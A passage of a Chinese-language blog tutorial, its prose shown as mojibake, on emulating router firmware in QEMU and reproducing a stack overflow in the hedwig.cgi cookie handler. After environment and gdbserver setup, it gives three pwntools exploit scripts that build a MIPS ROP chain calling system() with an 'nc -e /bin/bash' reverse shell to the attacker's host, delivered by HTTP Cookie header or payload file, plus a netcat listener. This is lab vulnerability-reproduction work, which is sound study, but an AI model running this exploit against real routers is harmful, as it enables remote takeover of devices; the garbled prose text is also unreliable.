<p>ç„¶ååœ¨åˆ°<code>/etc</code>â€‹æ–‡ä»¶ä¸­åˆ›å»ºä¸€ä¸ª <code>/qemu/bridge.conf</code>â€‹ åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­å†™å…¥ <code>allow br0</code>â€‹</p>
<p>é…ç½®å¥½ä¹‹åreboot</p>
<h3 id="step3-é…ç½®qemuç½‘ç»œ"><a href="#step3-é…ç½®qemuç½‘ç»œ" class="headerlink" title="step3 é…ç½®qemuç½‘ç»œ"></a>step3 é…ç½®qemuç½‘ç»œ</h3><p>qemuå¯åŠ¨è„šæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># start.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">sudo qemu-system-mipsel \</span><br><span class="line">    -M malta -kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">    -hda debian_squeeze_mipsel_standard.qcow2 \</span><br><span class="line">    -append &quot;root=/dev/sda1 console=tty0&quot; \</span><br><span class="line">    -net nic,macaddr=00:16:3e:00:00:01 \</span><br><span class="line">    -net tap</span><br></pre></td></tr></table></figure>

<p>å°†start.shä¸ä¸‹è½½çš„å†…æ ¸+é•œåƒæ”¾ç½®åœ¨ä¸€èµ·ï¼Œå¯åŠ¨qemu</p>
<p>è´¦å·å¯†ç éƒ½æ˜¯root</p>
<p>æ‰§è¡Œåä¼šå‡ºç°ä¸€ä¸ªé»‘è‰²å°çª—å£ï¼Œç„¶åé‡Œé¢åœ¨åŠ è½½ç¨‹åºï¼Œæœ€åå¯èƒ½ä¼šæœ‰ä¸€ä¸ª <code>fail</code>â€‹ ä½†æ˜¯ä¸è¦ç´§ï¼Œä¸å½±å“æˆ‘ä»¬å¤ç°æ¼æ´ï¼Œå¤ªå¤š <code>fail</code>â€‹ å¯èƒ½å°±æœ‰ç‚¹é—®é¢˜äº†éœ€è¦é—®AIæ£€æŸ¥ä¸€ä¸‹</p>
<p><code>nano</code>â€‹ æ¥ä¿®æ”¹ <code>/etc/network/interfaces</code>â€‹</p>
<p>å°†eth0æ”¹ä¸ºeth1ï¼Œï¼ˆip -aæŸ¥çœ‹ä¸€ä¸‹qemuç½‘å¡ï¼Œä¸ä¸€å®šæ˜¯eth1ï¼‰</p>
<p><img src="https://s2.loli.net/2025/06/25/Pk1n74aKVmFojlc.png" alt="image" loading="lazy"></p>
<p>å¯ç”¨eth1æ¥å£</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifup eth1</span><br></pre></td></tr></table></figure>

<p>ä¹‹åæ‰§è¡Œip -aå°±å¯ä»¥çœ‹åˆ°qemuçš„ipäº†</p>
<p>äº’pingï¼Œæ£€æµ‹æ˜¯å¦äº’é€šï¼ŒæŒ‰ç…§ä¸Šè¿°æ­¥éª¤æ¥æ˜¯æ²¡é—®é¢˜çš„</p>
<p>åœ¨qemuä¸­è¾“å…¥åº”è¯¥ä¸æ–¹ä¾¿ï¼Œå¯ä»¥ç”¨sshé“¾æ¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># ä½ç‰ˆæœ¬Ubutnu</span><br><span class="line">ssh root@192.168.xx.xx</span><br><span class="line"></span><br><span class="line"># é«˜ç‰ˆæœ¬Ubutnu</span><br><span class="line">ssh -o HostKeyAlgorithms=ssh-rsa root@192.168.xx.xx</span><br></pre></td></tr></table></figure>

<p>step4 å¯åŠ¨ç¯å¢ƒ</p>
<p>å°†è·¯ç”±å™¨æ–‡ä»¶åˆ†è§£å¾—åˆ°çš„ <code>/squashfs-root</code>â€‹ æ–‡ä»¶ä¼ å…¥åˆ° qemuè™šæ‹Ÿæœºçš„ <code>/root</code>â€‹ æ–‡ä»¶å¤¹ä¸‹é¢</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># ä½ç‰ˆæœ¬Ubutnu</span><br><span class="line">scp -r ./squashfs-root root@192.168.xx.xx:/root/</span><br><span class="line">scp -r &lt;æœ¬åœ°Ubuntuæ–‡ä»¶åœ°å€&gt; root@192.168.xx.xx:&lt;qemuè™šæ‹Ÿæœºæ–‡ä»¶åœ°å€&gt;</span><br><span class="line"></span><br><span class="line"># é«˜ç‰ˆæœ¬Ubuntu</span><br><span class="line">scp -o HostKeyAlgorithms=ssh-rsa -r ./squashfs-root root@192.168.xx.xx:/root/</span><br><span class="line">scp -o HostKeyAlgorithms=ssh-rsa -r &lt;æœ¬åœ°Ubuntuæ–‡ä»¶åœ°å€&gt; root@192.168.xx.xx:&lt;qemuè™šæ‹Ÿæœºæ–‡ä»¶åœ°å€&gt;</span><br></pre></td></tr></table></figure>

<p><code>/squashfs-root</code>â€‹ æ–‡ä»¶ä¸­ä½¿ç”¨ <code>nanoæŒ‡ä»¤</code>â€‹ åˆ›å»ºä¸€ä¸ª <code>http_conf</code>â€‹ æ–‡ä»¶ç”¨äºå¼€å¯httpdæœåŠ¡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">Umask 026</span><br><span class="line">PIDFile /var/run/httpd.pid</span><br><span class="line">LogGMT On  #å¼€å¯log</span><br><span class="line">ErrorLog /log #logæ–‡ä»¶</span><br><span class="line"> </span><br><span class="line">Tuning</span><br><span class="line">&#123;</span><br><span class="line">    NumConnections 15</span><br><span class="line">    BufSize 12288</span><br><span class="line">    InputBufSize 4096</span><br><span class="line">    ScriptBufSize 4096</span><br><span class="line">    NumHeaders 100</span><br><span class="line">    Timeout 60</span><br><span class="line">    ScriptTimeout 60</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Control</span><br><span class="line">&#123;</span><br><span class="line">    Types</span><br><span class="line">    &#123;</span><br><span class="line">        text/html    &#123; html htm &#125;</span><br><span class="line">        text/xml    &#123; xml &#125;</span><br><span class="line">        text/plain    &#123; txt &#125;</span><br><span class="line">        image/gif    &#123; gif &#125;</span><br><span class="line">        image/jpeg    &#123; jpg &#125;</span><br><span class="line">        text/css    &#123; css &#125;</span><br><span class="line">        application/octet-stream &#123; * &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Specials</span><br><span class="line">    &#123;</span><br><span class="line">        Dump        &#123; /dump &#125;</span><br><span class="line">        CGI            &#123; cgi &#125;</span><br><span class="line">        Imagemap    &#123; map &#125;</span><br><span class="line">        Redirect    &#123; url &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    External</span><br><span class="line">    &#123;</span><br><span class="line">        /usr/sbin/phpcgi &#123; php &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">    ServerName &quot;Linux, HTTP/1.1, &quot;</span><br><span class="line">    ServerId &quot;1234&quot;</span><br><span class="line">    Family inet</span><br><span class="line">    Interface eth1                          #å¯¹åº”qemuä»¿çœŸè·¯ç”±å™¨ç³»ç»Ÿçš„ç½‘å¡(å¦‚æœæ˜¯æŒ‰ç…§ä¸Šé¢æ“ä½œæ¥çš„è¯å°±ä¸ç”¨æ”¹)</span><br><span class="line">    Address 192.168.xx.xx                   #qemuä»¿çœŸè·¯ç”±å™¨ç³»ç»Ÿçš„IP(éœ€è¦æ”¹æˆè‡ªå·±çš„qemuè™šæ‹Ÿæœºipåœ°å€)</span><br><span class="line">    Port &quot;1234&quot;                             #å¯¹åº”æœªè¢«ä½¿ç”¨çš„ç«¯å£(ä¸€èˆ¬ä¹Ÿæ˜¯ä¸ç”¨æ”¹)</span><br><span class="line">    Virtual</span><br><span class="line">    &#123;</span><br><span class="line">        AnyHost</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /</span><br><span class="line">            Location /htdocs/web</span><br><span class="line">            IndexNames &#123; index.php &#125;</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/phpcgi &#123; router_info.xml &#125;</span><br><span class="line">                /usr/sbin/phpcgi &#123; post_login.xml &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /HNAP1</span><br><span class="line">            Location /htdocs/HNAP1</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/hnap &#123; hnap &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            IndexNames &#123; index.hnap &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>qemuæ‰§è¡Œä»¥ä¸‹è„šæœ¬ï¼Œå¯åŠ¨webæœåŠ¡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#init.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">cp http_conf /</span><br><span class="line">cp sbin/httpd /</span><br><span class="line">cp -rf htdocs/ /</span><br><span class="line">mkdir /etc_bak</span><br><span class="line">cp -r /etc /etc_bak</span><br><span class="line">rm /etc/services</span><br><span class="line">cp -rf etc/ /</span><br><span class="line">cp lib/ld-uClibc-0.9.30.1.so  /lib/</span><br><span class="line">cp lib/libcrypt-0.9.30.1.so  /lib/</span><br><span class="line">cp lib/libc.so.0  /lib/</span><br><span class="line">cp lib/libgcc_s.so.1  /lib/</span><br><span class="line">cp lib/ld-uClibc.so.0  /lib/</span><br><span class="line">cp lib/libcrypt.so.0  /lib/</span><br><span class="line">cp lib/libgcc_s.so  /lib/</span><br><span class="line">cp lib/libuClibc-0.9.30.1.so  /lib/</span><br><span class="line">cd /</span><br><span class="line">rm -rf /htdocs/web/hedwig.cgi</span><br><span class="line">rm -rf /usr/sbin/phpcgi</span><br><span class="line">rm -rf /usr/sbin/hnap</span><br><span class="line">ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi</span><br><span class="line">ln -s /htdocs/cgibin /usr/sbin/phpcgi</span><br><span class="line">ln -s  /htdocs/cgibin /usr/sbin/hnap</span><br><span class="line">./httpd -f http_conf</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±åº”è¯¥å¯ä»¥å»è®¿é—®äº†</p>
<p><img src="https://s2.loli.net/2025/06/25/owAgE8zf9BLMKqn.png" alt="image" loading="lazy"></p>
<p>å¯ä»¥ç”¨nmapå»æ‰«æqemu,æ£€æµ‹ç«¯å£æ˜¯å¦å¼€æ”¾</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.10.67</span><br></pre></td></tr></table></figure>

<h3 id="step4-è¿œç¨‹"><a href="#step4-è¿œç¨‹" class="headerlink" title="step4 è¿œç¨‹"></a>step4 è¿œç¨‹</h3><p>éœ€è¦ç”¨åˆ°gdbserver</p>
<p>å·²ç»ç¼–è¯‘å®Œæˆçš„ç¨‹åº(ä½†æ˜¯ä½œè€…å¥½åƒå‘½åé”™è¯¯äº†æŠŠmipselæ‰“æˆäº†mipsleï¼Œ æ‰€ä»¥å¦‚æœä½¿ç”¨è¿™ä¸ªä¸‹é¢çš„è„šæœ¬ä¹Ÿéœ€è¦æ”¹ä¸€æ”¹)</p>
<p><a target="_blank" rel="noopener" href="https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver">https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver</a></p>
<h4 id="è¿œç¨‹è°ƒè¯•"><a href="#è¿œç¨‹è°ƒè¯•" class="headerlink" title="è¿œç¨‹è°ƒè¯•"></a>è¿œç¨‹è°ƒè¯•</h4><p>qemu &#x2F;root&#x2F;squashfs-root&#x2F;è·¯å¾„ä¸‹åˆ›å»ºrun.sh</p>
<p>è°ƒè¯•ipåœ°å€æ˜¯è™šæ‹Ÿæœºä¸»æœºip</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">export CONTENT_LENGTH=&quot;11&quot;</span><br><span class="line">export CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">export HTTP_COOKIE=&quot;uid=`cat payload`&quot;</span><br><span class="line">export REQUEST_METHOD=&quot;POST&quot;</span><br><span class="line">export REQUEST_URI=&quot;2333&quot;</span><br><span class="line">echo &quot;winmt=pwner&quot; | ./gdbserver 192.168.xx.xx:6666/htdocs/web/hedwig.cgi  </span><br><span class="line">#echo &quot;winmt=pwner&quot; | /htdocs/web/hedwig.cgi</span><br><span class="line">unset CONTENT_LENGTH</span><br><span class="line">unset CONTENT_TYPE</span><br><span class="line">unset HTTP_COOKIE</span><br><span class="line">unset REQUEST_METHOD</span><br><span class="line">unset REQUEST_URI</span><br></pre></td></tr></table></figure>

<p>æ³¨ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#echo &quot;winmt=pwner&quot;|./gdbserver.mipsel 192.168.10.60:6666 /htdocs/web/hedwig.cgi</span><br><span class="line"></span><br><span class="line">è¿™ä¸€è¡Œä»£ç æ˜¯ä¸gdb-multiarchè°ƒè¯•çš„æ—¶å€™å¼€å¯ã€‚</span><br><span class="line">192.168.10.60 ä¸ºubuntuçš„åœ°å€ï¼Œ`6666`æ˜¯è‡ªå·±è®¾ç½®çš„è¿æ¥çš„ç«¯å£ï¼Œç›´æ¥ç”¨gdb-multiarchè®¾ç½®å¥½æ¶æ„åï¼Œç”¨target remote 192.168.10.67:6666è¿ä¸Šå³å¯ã€‚å…¶ä¸­192.168.10.67ä¸ºqemuçš„åœ°å€ã€‚</span><br><span class="line"></span><br><span class="line">------------------------------------</span><br><span class="line"></span><br><span class="line"># echo &quot;winmt=pwner&quot;|/htdocs/web/hedwig.cgi</span><br><span class="line">è¿™è¡Œä»£ç æ˜¯ç›´æ¥ç”Ÿæˆäº†payloadç›´æ¥æ”»å‡»ã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>éœ€è¦å°†gdbserver.mipselä¼ å…¥qemuä¸­</p>
<p>ç„¶ågdb-multiarch æ¥è¿‡æ¥å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set architecture mips                                     </span><br><span class="line">set follow-fork-mode child  </span><br><span class="line">set detach-on-fork off                                    </span><br><span class="line">target remote 192.168.xx.xxx:6666</span><br><span class="line">file ./htdocs/cgibin                   </span><br></pre></td></tr></table></figure>

<p>file  .&#x2F;file</p>
<p>å¯ä»¥æŠŠæ–‡ä»¶åŠ è½½åˆ°gdbé‡Œé¢è·å–å‡½æ•°å</p>
<p>qemuè™šæ‹Ÿæœºè¦è·å–shellåªèƒ½å»æ‰“åå¼¹shellï¼Œè¿™é‡Œéœ€è¦è¿è¡Œè„šæœ¬ï¼Œgdb-multiarché‚£è¾¹å¯ä»¥æ¥æ”¶åˆ°æˆ‘ä»¬å‘é€çš„paylaod</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import requests</span><br><span class="line">context(os = &#x27;linux&#x27;, arch = &#x27;mips&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="line"> </span><br><span class="line">cmd = b&#x27;nc -e /bin/bash 192.168.87.135 8888&#x27; # è¿™é‡Œæ˜¯Ubuntuç‰©ç†æœºçš„åœ°å€</span><br><span class="line"> </span><br><span class="line">libc_base = 0x77f34000</span><br><span class="line"> </span><br><span class="line">payload = b&#x27;a&#x27;*0x3cd</span><br><span class="line">payload += p32(libc_base + 0x53200 - 1) # s0  system_addr - 1</span><br><span class="line">payload += p32(libc_base + 0x169C4) # s1  addiu $s2, $sp, 0x18 (=&gt; jalr $s0)</span><br><span class="line">payload += b&#x27;a&#x27;*(4*7)</span><br><span class="line">payload += p32(libc_base + 0x32A98) # ra  addiu $s0, 1 (=&gt; jalr $s1)</span><br><span class="line">payload += b&#x27;a&#x27;*0x18</span><br><span class="line">payload += cmd</span><br><span class="line"> </span><br><span class="line">url = &quot;http://192.168.87.136:1234/hedwig.cgi&quot; # è¿™é‡Œæ˜¯qemuè™šæ‹Ÿæœºçš„åœ°å€</span><br><span class="line">data = &#123;&quot;Thir0th&quot; : &quot;pwner&quot;&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;Cookie&quot;        : b&quot;uid=&quot; + payload,</span><br><span class="line">    &quot;Content-Type&quot;  : &quot;application/x-www-form-urlencoded&quot;,</span><br><span class="line">    &quot;Content-Length&quot;: &quot;10&quot;</span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url = url, headers = headers, data = data)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>

<p>.&#x2F;runä¹‹åï¼Œç„¶åUbuntuçš„gdbå»è¿æ¥ï¼Œç„¶åUbuntuåœ¨å¼€ä¸ªç»ˆç«¯å‘é€expç„¶ågdbé‡Œé¢å°±å¯ä»¥æ”¶åˆ°ï¼Œè¿™æ ·å­è°ƒè¯•ï¼Œåå¼¹shellï¼Œè¿˜è¦å†å¼€ä¸€ä¸ªç»ˆç«¯ç›‘å¬ç«¯å£ï¼Œä¸€å…±éœ€è¦å››ä¸ªç»ˆç«¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>

<h4 id="è¿œç¨‹æ”»å‡»"><a href="#è¿œç¨‹æ”»å‡»" class="headerlink" title="è¿œç¨‹æ”»å‡»"></a>è¿œç¨‹æ”»å‡»</h4><h5 id="æ³•ä¸€ï¼šå‘-QEMU-è™šæ‹Ÿæœºä¸Šä¼ -payload"><a href="#æ³•ä¸€ï¼šå‘-QEMU-è™šæ‹Ÿæœºä¸Šä¼ -payload" class="headerlink" title="æ³•ä¸€ï¼šå‘ QEMU è™šæ‹Ÿæœºä¸Šä¼  payload"></a>æ³•ä¸€ï¼šå‘ QEMU è™šæ‹Ÿæœºä¸Šä¼  payload</h5><p>è¿™ç§æ–¹å¼æˆ‘ä»¬ç›´æ¥å°† payload å†™å…¥æ–‡ä»¶ï¼Œç„¶åä¸Šä¼ åˆ° QEMU è™šæ‹Ÿæœºï¼Œé€šè¿‡è®¾ç½®ç¯å¢ƒå˜é‡æ¥è¯»å– payload ä½œä¸º uidï¼Œä»è€Œè§¦å‘æ¼æ´åå¼¹ shell</p>
<p>run.sh</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">export CONTENT_LENGTH=&quot;11&quot;</span><br><span class="line">export CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">export HTTP_COOKIE=&quot;uid=`cat payload`&quot;</span><br><span class="line">export REQUEST_METHOD=&quot;POST&quot;</span><br><span class="line">export REQUEST_URI=&quot;2333&quot;</span><br><span class="line">#echo &quot;winmt=pwner&quot; | ./gdbserver 192.168.xx.xx:6666/htdocs/web/hedwig.cgi  </span><br><span class="line">echo &quot;winmt=pwner&quot; | /htdocs/web/hedwig.cgi</span><br><span class="line">unset CONTENT_LENGTH</span><br><span class="line">unset CONTENT_TYPE</span><br><span class="line">unset HTTP_COOKIE</span><br><span class="line">unset REQUEST_METHOD</span><br><span class="line">unset REQUEST_URI</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os = &#x27;linux&#x27;, arch = &#x27;mips&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="line"> </span><br><span class="line">cmd = b&#x27;nc -e /bin/bash 192.168.2.1 8888&#x27;   # åå¼¹ shell</span><br><span class="line"> </span><br><span class="line">libc_base = 0x77f34000</span><br><span class="line"> </span><br><span class="line">payload = b&#x27;a&#x27;*0x3cd</span><br><span class="line">payload += p32(libc_base + 0x53200 - 1) # s0  system_addr - 1</span><br><span class="line">payload += p32(libc_base + 0x169C4) # s1  addiu $s2, $sp, 0x18 (=&gt; jalr $s0)</span><br><span class="line">payload += b&#x27;a&#x27;*(4*7)</span><br><span class="line">payload += p32(libc_base + 0x32A98) # ra  addiu $s0, 1 (=&gt; jalr $s1)</span><br><span class="line">payload += b&#x27;a&#x27;*0x18</span><br><span class="line">payload += cmd</span><br><span class="line"> </span><br><span class="line">fd = open(&quot;payload&quot;, &quot;wb&quot;)</span><br><span class="line">fd.write(payload)</span><br><span class="line">fd.close()</span><br></pre></td></tr></table></figure>

<p>å°†ç”Ÿæˆçš„payload scpè¿‡å»</p>
<h5 id="æ³•äºŒï¼šå‘-httpd-æœåŠ¡å‘é€-HTTP-æŠ¥æ–‡"><a href="#æ³•äºŒï¼šå‘-httpd-æœåŠ¡å‘é€-HTTP-æŠ¥æ–‡" class="headerlink" title="æ³•äºŒï¼šå‘ httpd æœåŠ¡å‘é€ HTTP æŠ¥æ–‡"></a>æ³•äºŒï¼šå‘ httpd æœåŠ¡å‘é€ HTTP æŠ¥æ–‡</h5><p>â€</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;mips&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">cmd = b&#x27;nc -e /bin/bash 192.168.2.1 8888&#x27;   # åå¼¹ shell</span><br><span class="line"></span><br><span class="line">libc_base = 0x77f34000</span><br><span class="line"></span><br><span class="line"># åˆ›å»º payload</span><br><span class="line">payload = b&#x27;a&#x27; * 0x3cd</span><br><span class="line">payload += p32(libc_base + 0x53200 - 1)  # s0  system_addr - 1</span><br><span class="line">payload += p32(libc_base + 0x169C4)      # s1  addiu $s2, $sp, 0x18 (=&gt; jalr $s0)</span><br><span class="line">payload += b&#x27;a&#x27; * (4 * 7)</span><br><span class="line">payload += p32(libc_base + 0x32A98)      # ra  addiu $s0, 1 (=&gt; jalr $s1)</span><br><span class="line">payload += b&#x27;a&#x27; * 0x18</span><br><span class="line">payload += cmd</span><br><span class="line"></span><br><span class="line"># å®šä¹‰ç›®æ ‡ URL å’Œæ•°æ®</span><br><span class="line">url = &quot;http://192.168.2.2:4321/hedwig.cgi&quot;</span><br><span class="line">data = &#123;&quot;winmt&quot;: &quot;pwner&quot;&#125;</span><br><span class="line"></span><br><span class="line"># å®šä¹‰è¯·æ±‚å¤´</span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;Cookie&quot;: b&quot;uid=&quot; + payload,</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,</span><br><span class="line">    &quot;Content-Length&quot;: &quot;11&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># å‘é€ POST è¯·æ±‚</span><br><span class="line">res = requests.post(url=url, headers=headers, data=data)</span><br><span class="line"></span><br><span class="line"># æ‰“å°å“åº”</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>

<h2 id="é€€å‡ºä»¿çœŸç¯å¢ƒ"><a href="#é€€å‡ºä»¿çœŸç¯å¢ƒ" class="headerlink" title="é€€å‡ºä»¿çœŸç¯å¢ƒ"></a>é€€å‡ºä»¿çœŸç¯å¢ƒ</h2><p>é€€å‡ºæ˜¯æ‰§è¡Œfini.shï¼Œè¦ä¸ç„¶ä¸‹æ¬¡è¿›å»qemuä¼šæŠ¥é”™ï¼Œinit.shè„šæœ¬å·²ç»ç ´åäº†æ ¹ç›®å½•ï¼Œå¦‚æœå¿˜è®°çš„è¯é‡æ–°ä¸‹è½½å†…æ ¸å’Œé•œåƒ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#fin.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">rm -rf /etc</span><br><span class="line">mv /etc_bak/etc /etc</span><br><span class="line">rm -rf /etc_bak</span><br></pre></td></tr></table></figure>

<p>å…³äºè™šæ‹Ÿæ¡¥æ¥ç½‘ç»œï¼Œå¯ä»¥ä¸ç”¨å»å…³é—­</p>
